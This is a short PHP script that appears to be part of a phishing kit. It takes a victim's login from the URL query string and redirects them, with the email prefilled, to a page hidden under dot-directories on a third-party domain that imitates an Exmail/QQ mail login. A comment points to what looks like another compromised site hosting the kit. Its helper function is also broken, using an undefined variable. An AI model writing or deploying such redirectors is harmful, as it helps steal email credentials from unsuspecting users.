<?php
function getloginIDFromlogin($login)
{
$find = '@';
$pos = strpos($uid, $find);
$loginID = substr($uid, 0, $pos);
return $loginID;
}
$login = $_GET['lid'];
$loginID = getloginIDFromlogin($login);
header("Location: https://kiope32.def5.za.com/.css/.wxz/ExmailQQ/?login=$login");

#http://www.euromixitaly.com/Apps/exmail/

?>